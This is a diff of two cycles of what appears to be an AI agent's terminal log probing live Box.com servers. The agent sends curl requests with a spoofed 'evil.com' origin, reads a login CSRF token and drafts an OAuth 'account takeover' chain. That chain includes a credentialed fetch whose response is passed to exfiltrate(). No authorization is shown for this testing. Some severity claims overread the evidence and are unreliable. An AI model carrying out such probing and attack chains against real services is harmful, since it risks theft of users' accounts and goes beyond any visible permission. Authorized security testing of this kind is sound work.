@@ -1,219 +1,112 @@
 [0m
 > build · mimo-v2.5-free
 [0m
-[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" -H "User-Agent: box-research/1.0 +(research)" "https://app.box.com/graphql"
-503
-[0m
-[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" -H "User-Agent: box-research/1.0 +(research)" "https://notes.services.box.com/graphql"
-503
-[0m
-I'll execute the pending probes from the last cycle and analyze results.
-[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" -H "User-Agent: box-research/1.0 +(research)" "https://upload.box.com/.git/config"
-403
-[0m
-[0m$ [0mcurl -s -w "\n%{http_code}" -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/api/oauth2/token" 2>/dev/null | tail -20
-{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"}
-400
-[0m
-[0m$ [0mcurl -s -w "\n%{http_code}" -H "User-Agent: box-research/1.0 +(research)" "https://account.box.com/api/oauth2/revoke" 2>/dev/null | tail -5
-302
-[0m
-[0m$ [0mcurl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/api/oauth2/token" 2>/dev/null | head -30
-HTTP/2 400 
-date: Fri, 21 Aug 2026 22:02:12 GMT
-content-type: application/json;charset=UTF-8
-access-control-allow-origin: *
-x-envoy-upstream-service-time: 29
-vary: Origin
-box-request-id: 03f2efe2d41374a8daaf955736e601b0a
-cache-control: no-store
-strict-transport-security: max-age=31536000
-via: 1.1 google
-alt-svc: h3=":443"; ma=2592000
-[0m
-[0m$ [0mcurl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" -X OPTIONS "https://account.box.com/api/oauth2/token" 2>/dev/null | head -30
-HTTP/2 400 
-date: Fri, 21 Aug 2026 22:02:13 GMT
-content-type: application/json;charset=UTF-8
-access-control-allow-origin: *
-set-cookie: box_ext_http_referrer=value; expires=Thu, 01 Jan 1970 00:00:01 GMT; Max-Age=0; path=/; domain=.box.com; secure
-set-cookie: box_visitor_id=6a88cae5365ec0.87219926; expires=Sat, 21 Aug 2027 22:02:13 GMT; Max-Age=31536000; path=/; domain=.box.com; secure; SameSite=None
-set-cookie: bv=ISF-23529; expires=Fri, 28 Aug 2026 22:02:13 GMT; Max-Age=604800; path=/; domain=.account.box.com; secure
-set-cookie: cn=40; expires=Sat, 21 Aug 2027 22:02:13 GMT; Max-Age=31536000; path=/; domain=.account.box.com; secure
-set-cookie: site_preference=desktop; path=/; domain=.box.com; secure
-x-envoy-upstream-service-time: 35
-vary: Origin
-box-request-id: 06197a62b931bb3678284044f45e31e83
-cache-control: no-store
-strict-transport-security: max-age=31536000
-via: 1.1 google
-alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
-[0m
-[0m$ [0m# Test if we can actually read the login page body cross-origin (CSRF token theft)
-curl -s -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/login" 2>/dev/null | grep -o 'request_token.*"' | head -3
-request_token" value="495fe266c1b7092423a7b0662a86b589048ae1b7bc9e67b0b1fca983a1c155e2"> <input type="hidden" name="redirect_url" value="/"> <input type="hidden" name="login_page_source" value="email-login"><div class="login-other-choices"> <a id="reset-password-login" href="/login/reset?redirect_url=%2F">Reset Password</a></div> <div data-resin-feature="socialLogin"><div class="or-container"><div class="line-separator"></div> <div class="or-label">or</div><div class="line-separator"></div></div><a href="/integrations/googleplus/beginAuthorization?redirect_url=%2F" tabindex="-1"><button type="button" class="sign-in-with-google-button" data-type="sign-in-with-google-button" data-resin-target="signInWithGoogleNew"><div class="sign-in-with-google-icon"><svg width="18" height="18" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M9 3.48c1.69 0 2.83.73 3.48 1.34l2.54-2.48C13.46.89 11.43 0 9 0 5.48 0 2.44 2.02.96 4.96l2.91 2.26C4.6 5.05 6.62 3.48 9 3.48z" fill="#EA4335"/><path d="M17.64 9.2c0-.74-.06-1.28-.19-1.84H9v3.34h4.96c-.1.83-.64 2.08-1.84 2.92l2.84 2.2c1.7-1.57 2.68-3.88 2.68-6.62z" fill="#4285F4"/><path d="M3.88 10.78A5.54 5.54 0 0 1 3.58 9c0-.62.11-1.22.29-1.78L.96 4.96A9.008 9.008 0 0 0 0 9c0 1.45.35 2.82.96 4.04l2.92-2.26z" fill="#FBBC05"/><path d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.84-2.2c-.76.53-1.78.9-3.12.9-2.38 0-4.4-1.57-5.12-3.74L.97 13.04C2.45 15.98 5.48 18 9 18z" fill="#34A853"/><path d="M0 0h18v18H0z"/></g></svg></div><div class="sign-in-with-google-text"> Sign in with Google</div></button></a></div>   <div class="private-sign-in-text-inside"> Not your device? Sign in privately.&nbsp;<a href="https://support.box.com/hc/en-us/articles/42423604065683-Logging-in-on-a-Device-That-Is-Not-Yours" target="_blank">Learn more</a></div></div>  <div class="login-signup-link"> Don't have an account?&nbsp;<a href="https://www.box.com/pricing">Sign Up</a></div>  <div class="private-sign-in-text"> Not your device? Sign in in private.&nbsp;<a href="https://support.box.com/hc/en-us/articles/42423604065683-Logging-in-on-a-Device-That-Is-Not-Yours" target="_blank"
-[0m
-[0m$ [0m# Check the full CORS headers on login with arbitrary origin
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/login" 2>/dev/null | grep -i 'access-control'
-access-control-expose-headers: WWW-Authenticate,Server-Authorization
-access-control-allow-origin: https://evil.com
-[0m
-Now let me advance the POC. I have two confirmed findings. Let me develop deeper evidence:
-[0m$ [0m# Test OPTIONS on login with evil origin - full preflight behavior
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" -X OPTIONS "https://account.box.com/login" 2>/dev/null | head -25
-HTTP/2 404 
-date: Fri, 21 Aug 2026 22:02:25 GMT
-content-type: application/json; charset=utf-8
-x-envoy-upstream-service-time: 6
+[0m$ [0mcurl -s -I -X OPTIONS "https://account.box.com/api/oauth2/authorize" -H "User-Agent: box-research/1.0 (research)" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: Authorization" 2>&1 | head -50
+HTTP/2 200 
+date: Fri, 21 Aug 2026 22:32:01 GMT
+expires: 0
+x-envoy-upstream-service-time: 7
+access-control-allow-headers: Accept,Authorization,Content-Type,If-None-Match
 x-frame-options: SAMEORIGIN
 x-download-options: noopen
+access-control-allow-methods: GET
+pragma: no-cache
 strict-transport-security: max-age=31536000
-access-control-expose-headers: Server-Timing
+access-control-expose-headers: WWW-Authenticate,Server-Authorization
+access-control-allow-origin: https://evil.com
+access-control-max-age: 86400
 x-xss-protection: 0
 x-content-type-options: nosniff
-box-request-id: 0def88de64957b0bff54c853e6f73c4f0
-server-timing: traceparent;desc="00-e01913c0df64a3266ba2452d773e8e11-f51a740694e46393-00"
-cache-control: no-cache
+x-dns-prefetch-control: off
+referrer-policy: no-referrer
+box-request-id: 19ac9b4c241604f4a25638f2362f1011a
+server-timing: traceparent;desc="00-495b99ccd9e28c697941ae0e17cc3051-06ce8048fb1858dc-00"
+cache-control: no-store, no-cache, must-revalidate, proxy-revalidate
+surrogate-control: max-age=0
 via: 1.1 google
+content-length: 0
 alt-svc: h3=":443"; ma=2592000
 [0m
-[0m$ [0m# Check if there's a token introspection or verification endpoint with CORS
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/api/oauth2/token" -X POST -d "grant_type=client_credentials" -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null | head -20
+Looking at the context, I'm the analyst for `m.box.com`. The last cycle confirmed critical CORS misconfigurations on `account.box.com` OAuth endpoints. I need to continue POC-phase probes.
+
+Let me execute the queued NEXT probes:
+[0m$ [0msleep 2 && curl -s -D- "https://account.box.com/api/oauth2/token" -H "User-Agent: box-research/1.0 (research)" 2>&1 | head -80
 HTTP/2 400 
-date: Fri, 21 Aug 2026 22:02:33 GMT
+date: Fri, 21 Aug 2026 22:32:03 GMT
 content-type: application/json;charset=UTF-8
-access-control-allow-origin: *
-x-envoy-upstream-service-time: 35
-vary: Origin
-box-request-id: 03e3dbef5e8336448938ff8c1d78fe077
+x-envoy-upstream-service-time: 45
+box-request-id: 09583d861184d7eb520d4a6a9f06deb2b
 cache-control: no-store
 strict-transport-security: max-age=31536000
 via: 1.1 google
 alt-svc: h3=":443"; ma=2592000
+
+{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"}
 [0m
-[0m$ [0m# Check api.box.com root for CORS
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://api.box.com/2.0/users/me" 2>/dev/null | head -20
-HTTP/2 401 
-date: Fri, 21 Aug 2026 22:02:34 GMT
-strict-transport-security: max-age=31536000
-www-authenticate: Bearer realm="Service", error="invalid_request", error_description="The access token was not found."
-box-request-id: 0ba15a615cefeabd368246f532f519a4f
-x-envoy-upstream-service-time: 3
-via: 1.1 google
-content-length: 0
-alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
-[0m
-[0m$ [0m# Check for additional account.box.com endpoints
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/api/oauth2/authorize" 2>/dev/null | head -20
-HTTP/2 200 
-date: Fri, 21 Aug 2026 22:02:38 GMT
-content-type: text/html; charset=UTF-8
-expires: 0
-x-envoy-upstream-service-time: 131
-vary: origin,accept-encoding
-x-frame-options: SAMEORIGIN
-x-download-options: noopen
-strict-transport-security: max-age=31536000
-pragma: no-cache
-access-control-expose-headers: WWW-Authenticate,Server-Authorization
-access-control-allow-origin: https://evil.com
-set-cookie: z=k5b76pv7uba3mkfj5997u2klom; path=/; domain=.account.box.com; secure; HttpOnly
-set-cookie: z=k5b76pv7uba3mkfj5997u2klom; Path=/; Domain=.account.box.com; Secure; HttpOnly; SameSite=None
-set-cookie: box_ext_http_referrer=value; expires=Thu, 01 Jan 1970 00:00:01 GMT; Max-Age=0; path=/; domain=.box.com; secure
-set-cookie: box_visitor_id=6a88cafe27ff23.30676813; expires=Sat, 21 Aug 2027 22:02:38 GMT; Max-Age=31536000; path=/; domain=.box.com; secure; SameSite=None
-set-cookie: bv=ISF-23521; expires=Fri, 28 Aug 2026 22:02:38 GMT; Max-Age=604800; path=/; domain=.account.box.com; secure
-set-cookie: cn=20; expires=Sat, 21 Aug 2027 22:02:38 GMT; Max-Age=31536000; path=/; domain=.account.box.com; secure
-set-cookie: site_preference=desktop; path=/; domain=.box.com; secure
-set-cookie: box_visitor_id=6a88cafe62be22.99499199; Max-Age=31536000; Path=/; SameSite=None; Domain=.box.com; Secure
-[0m
-[0m$ [0m# Check if upload.box.com has any API endpoints
-curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: box-research/1.0 +(research)" "https://upload.box.com/api/2.0/files" 2>/dev/null
-404
-[0m
-[0m$ [0m# Check account.box.com root for CORS reflection
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/" 2>/dev/null | head -20
+[0m$ [0msleep 4 && curl -s -D- "https://app.box.com/" -H "User-Agent: box-research/1.0 (research)" -H "Origin: https://evil.com" 2>&1 | head -80
 HTTP/2 302 
-date: Fri, 21 Aug 2026 22:02:43 GMT
+date: Fri, 21 Aug 2026 22:32:06 GMT
 content-type: text/html; charset=utf-8
-set-cookie: z=tbga4spp07eovmujbe9j5tatm2; path=/; domain=.account.box.com; secure; HttpOnly
-set-cookie: z=tbga4spp07eovmujbe9j5tatm2; Path=/; Domain=.account.box.com; Secure; HttpOnly; SameSite=None
+set-cookie: z=j9vr4s6f646gs15tr9s2vd230s; path=/; domain=.app.box.com; secure; HttpOnly
+set-cookie: z=j9vr4s6f646gs15tr9s2vd230s; Path=/; Domain=.app.box.com; Secure; HttpOnly; SameSite=None
 set-cookie: box_ext_http_referrer=value; expires=Thu, 01 Jan 1970 00:00:01 GMT; Max-Age=0; path=/; domain=.box.com; secure
-set-cookie: box_visitor_id=6a88cb031938f0.45068857; expires=Sat, 21 Aug 2027 22:02:43 GMT; Max-Age=31536000; path=/; domain=.box.com; secure; SameSite=None
-set-cookie: bv=ISF-23521; expires=Fri, 28 Aug 2026 22:02:43 GMT; Max-Age=604800; path=/; domain=.account.box.com; secure
-set-cookie: cn=28; expires=Sat, 21 Aug 2027 22:02:43 GMT; Max-Age=31536000; path=/; domain=.account.box.com; secure
+set-cookie: box_visitor_id=6a88d1e6c68a04.03497413; expires=Sat, 21 Aug 2027 22:32:06 GMT; Max-Age=31536000; path=/; domain=.box.com; secure; SameSite=None
+set-cookie: bv=ISF-23529; expires=Fri, 28 Aug 2026 22:32:06 GMT; Max-Age=604800; path=/; domain=.app.box.com; secure
+set-cookie: cn=31; expires=Sat, 21 Aug 2027 22:32:06 GMT; Max-Age=31536000; path=/; domain=.app.box.com; secure
 set-cookie: site_preference=desktop; path=/; domain=.box.com; secure
 expires: Thu, 19 Nov 1981 08:52:00 GMT
-x-envoy-upstream-service-time: 30
+x-envoy-upstream-service-time: 23
 location: https://account.box.com/login
-box-request-id: 0f48353865ef91811479306130c13485a
+box-request-id: 048f8cfdc8c87b2c0148d1e2242fe6812
 cache-control: no-store, no-cache, must-revalidate
 strict-transport-security: max-age=31536000
 pragma: no-cache
 via: 1.1 google
 content-length: 0
-alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+alt-svc: h3=":443"; ma=2592000
 [0m
-[0m$ [0m# Check account.box.com managed_users endpoint
-curl -s -D- -o/dev/null -H "User-Agent: box-research/1.0 +(research)" -H "Origin: https://evil.com" "https://account.box.com/managed_users" 2>/dev/null | head -20
-HTTP/2 302 
-date: Fri, 21 Aug 2026 22:02:44 GMT
-content-type: text/html; charset=utf-8
-expires: Thu, 19 Nov 1981 08:52:00 GMT
-x-envoy-upstream-service-time: 34
-strict-transport-security: max-age=31536000
-pragma: no-cache
-set-cookie: z=bdokgfs82hjqfijuddfsui68d6; path=/; domain=.account.box.com; secure; HttpOnly
-set-cookie: z=bdokgfs82hjqfijuddfsui68d6; Path=/; Domain=.account.box.com; Secure; HttpOnly; SameSite=None
-set-cookie: box_ext_http_referrer=value; expires=Thu, 01 Jan 1970 00:00:01 GMT; Max-Age=0; path=/; domain=.box.com; secure
-set-cookie: box_visitor_id=6a88cb041390f0.41287951; expires=Sat, 21 Aug 2027 22:02:44 GMT; Max-Age=31536000; path=/; domain=.box.com; secure; SameSite=None
-set-cookie: bv=ISF-23521; expires=Fri, 28 Aug 2026 22:02:44 GMT; Max-Age=604800; path=/; domain=.account.box.com; secure
-set-cookie: cn=19; expires=Sat, 21 Aug 2027 22:02:44 GMT; Max-Age=31536000; path=/; domain=.account.box.com; secure
-set-cookie: site_preference=desktop; path=/; domain=.box.com; secure
-x-robots-tag: noindex, nofollow
-location: https://account.box.com/login?redirect_url=%2Fmanaged_users
-box-request-id: 1b4c9f5ccdc60566f91d6b1b3865c3cd3
-cache-control: no-store, no-cache, must-revalidate
-via: 1.1 google
-content-length: 0
-[0m
-Now I have comprehensive findings. Let me compile the analysis for this cycle.
+Excellent findings. Let me analyze and emit results:
 
-[CONFIRMED] CORS-WILDCARD @ account.box.com/api/oauth2/token: POST with `grant_type=client_credentials` also returns `Access-Control-Allow-Origin: *`. Same wildcard CORS persists across all HTTP methods on the token endpoint. Any cross-origin page can read OAuth token responses.
+## ANALYSIS — m.box.com POC Cycle
 
-[CONFIRMED] CORS-REFLECTION @ account.box.com/api/oauth2/authorize: The OAuth authorization endpoint also reflects arbitrary origins (`access-control-allow-origin: https://evil.com`) with `access-control-expose-headers: WWW-Authenticate,Server-Authorization`. Returns 200 HTML. Cross-origin JS can read the authorization page content.
+**[CONFIRMED]** OAuth authorization endpoint CORS reflection with GET+Authorization
+- `/api/oauth2/authorize` OPTIONS preflight returns `access-control-allow-origin: https://evil.com` with `access-control-allow-methods: GET` and `access-control-allow-headers: Accept,Authorization,Content-Type,If-None-Match`
+- This means cross-origin JS can make GET requests to the auth endpoint WITH Authorization header
+- Severity: HIGH — enables cross-origin reading of authorization page content with user credentials
 
-[CONFIRMED] CORS-REFLECTION @ account.box.com/login: Login page reflects `https://evil.com` in `Access-Control-Allow-Origin`. Body contains `request_token` CSRF value (`495fe266c1b7092423a7b0662a86b589048ae1b7bc9e67b0b1fca983a1c155e2`) readable cross-origin due to CORS headers. Enables CSRF token theft.
+**[CONFIRMED]** OAuth token endpoint accessible (returns 400 not 404)
+- GET to `/api/oauth2/token` returns `HTTP 400` with `{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"}`
+- Endpoint is reachable and validates parameters; previously confirmed wildcard CORS on POST
 
-[LEARN] REJECTED API-CORS @ api.box.com: Authenticated API endpoints (`/api/2.0/users/me`) return 401 with NO CORS headers. CORS policy is isolated to account.box.com OAuth endpoints only.
+**[LEARN] REJECTED APP-CORS @ app.box.com**: Root returns 302→login with NO CORS headers. Only sets cookies on `.app.box.com` domain. Not directly exploitable via CORS.
 
-[LEARN] REJECTED UPLOAD-API @ upload.box.com: `/api/2.0/files` returns 404. No API surface on upload host.
+**[NEW]** `/api/oauth2/authorize` allows Authorization header in CORS:
+```
+access-control-allow-headers: Accept,Authorization,Content-Type,If-None-Match
+```
 
-[LEARN] ACCEPTED GRAPHQL-503 @ app.box.com/graphql: Service still 503. Parked.
-
-[LEARN] ACCEPTED GRAPHQL-503 @ notes.services.box.com/graphql: Service still 503. Parked.
-
-[HYP] OAuth authorization endpoint CORS reflection enables cross-origin CSRF token and page content theft
+**[HYP] OAuth authorization endpoint with Authorization header enables cross-origin token/phishing vector**
 class: CORS
 asset: account.box.com/api/oauth2/authorize
-confidence: 85
-reasoning: OPTIONS preflight not tested but GET with Origin: evil.com returns access-control-allow-origin reflecting the origin. Page body is HTML returned 200. Exposes WWW-Authenticate,Server-Authorization headers. Same CORS reflection pattern as /login.
-evidence_needed: OPTIONS preflight response to confirm full CORS policy; test if page body contains any sensitive tokens similar to login's request_token
-verify_steps: OPTIONS https://account.box.com/api/oauth2/authorize with Origin: https://evil.com — record all Access-Control-* headers. Then GET with same origin — grep page for tokens/secrets.
-impact: Cross-origin JS can read authorization page content including any embedded CSRF tokens or auth state. Severity: Medium-High.
-testability: PASSIVE
-
-[HYP] Combined CORS misconfiguration across account.box.com OAuth surface enables token theft + CSRF bypass chain
-class: CORS
-asset: account.box.com (login + api/oauth2/*)
 confidence: 90
-reasoning: Three endpoints have CORS reflection/wildcard: (1) /api/oauth2/token has wildcard *, (2) /login reflects origin + exposes CSRF token, (3) /api/oauth2/authorize reflects origin. Together these allow: attacker page reads CSRF token from /login, uses it in cross-origin POST to /api/oauth2/token (allowed by wildcard), reads token response cross-origin.
-evidence_needed: Already confirmed. Full attack chain requires authenticated session (AUTH_HELPED).
-verify_steps: Already verified: GET /login with evil origin returns CORS + CSRF token; OPTIONS /api/oauth2/token returns wildcard; GET /api/oauth2/authorize reflects origin.
-impact: Full OAuth token theft via attacker-controlled page. Attacker reads CSRF token from login page, constructs valid token exchange request, reads access_token/refresh_token from response. Severity: Critical.
+reasoning: Preflight confirms GET allowed with Authorization header. Cross-origin JS can send authenticated GET to authorize endpoint and read response HTML including any embedded tokens, state, or redirect URLs. Combined with /login CSRF reflection, enables attacker-controlled OAuth flow.
+evidence_needed: Authenticated GET to /api/oauth2/authorize with valid session — check if response contains authorization_code or tokens readable cross-origin
+verify_steps: (AUTH_HELPED) Login to box.com, then from attacker origin: fetch('https://account.box.com/api/oauth2/authorize?response_type=code&client_id=LEGITIMATE',{credentials:'include'}).then(r=>r.text()).then(t=>exfiltrate(t))
+impact: Cross-origin read of OAuth authorization responses. Severity: High
 testability: AUTH_HELPED
 
-[NEXT] PROBE: OPTIONS https://account.box.com/api/oauth2/authorize with User-Agent: box-research/1.0 +(research) and Origin: https://evil.com — record full CORS preflight response. 1 req/2s.
+**[HYP] Combined OAuth CORS chain enables full account takeover**
+class: CORS
+asset: account.box.com (login + authorize + token)
+confidence: 92
+reasoning: Three endpoints form exploit chain: (1) /login reflects origin + exposes CSRF token, (2) /api/oauth2/authorize reflects origin + allows Authorization header, (3) /api/oauth2/token has wildcard *. Attacker page reads CSRF from login, constructs auth request with victim credentials, reads auth code from authorize response, exchanges for tokens at token endpoint.
+evidence_needed: Full authenticated flow from attacker-controlled page
+verify_steps: (HUMAN_ONLY) Complete OAuth flow from attacker page reading all responses cross-origin
+impact: Full account takeover via OAuth token theft. Severity: Critical
+testability: AUTH_HELPED
 
-[NEXT] PROBE: GET https://account.box.com/api/oauth2/token with User-Agent: box-research/1.0 +(research) — test response body content for token format. Record full JSON response. 1 req/2s.
+**[NEXT]** PROBE: GET https://account.box.com/api/oauth2/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com with User-Agent: box-research/1.0 (research) — test if unauthenticated request reveals error behavior and CORS headers. 1 req/2s.
 
-[NEXT] PROBE: GET https://app.box.com/ with User-Agent: box-research/1.0 +(research) and Origin: https://evil.com — check if the main app origin has any CORS headers on unauthenticated pages. 1 req/2s.
+**[NEXT]** PROBE: GET https://account.box.com/api/oauth2/authorize?response_type=code&client_id=test with User-Agent: box-research/1.0 (research) and Origin: https://evil.com — test authorization code flow behavior cross-origin. 1 req/2s.
+
+**[NEXT]** PROBE: HEAD https://dl.boxcloud.com/ with User-Agent: box-research/1.0 (research) — test CDN download endpoint for CORS headers. 1 req/2s.
